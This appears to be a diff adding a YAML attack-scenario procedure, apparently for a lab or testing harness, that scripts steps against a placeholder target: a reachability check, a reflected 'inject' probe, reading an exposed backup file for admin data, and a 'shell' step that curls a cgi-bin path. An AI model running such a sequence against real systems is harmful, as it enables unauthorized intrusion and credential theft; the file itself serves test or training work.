@@ -1,0 +1,26 @@
+procedure:
+  - step_id: reach
+    action:
+      type: http_request
+      method: GET
+      url: "http://${target_host}:${target_port}/"
+    expect:
+      status: 200
+  - step_id: inject
+    action:
+      type: http_request
+      method: GET
+      url: "http://${target_host}:${target_port}/search?q=phantom_ride"
+    expect:
+      body_contains: "phantom_ride"
+  - step_id: read
+    action:
+      type: http_request
+      method: GET
+      url: "http://${target_host}:${target_port}/backup.bak"
+    expect:
+      body_contains: "admin"
+  - step_id: shell
+    action:
+      type: exec_attacker
+      command: "curl -s http://${target_host}/cgi-bin/x"
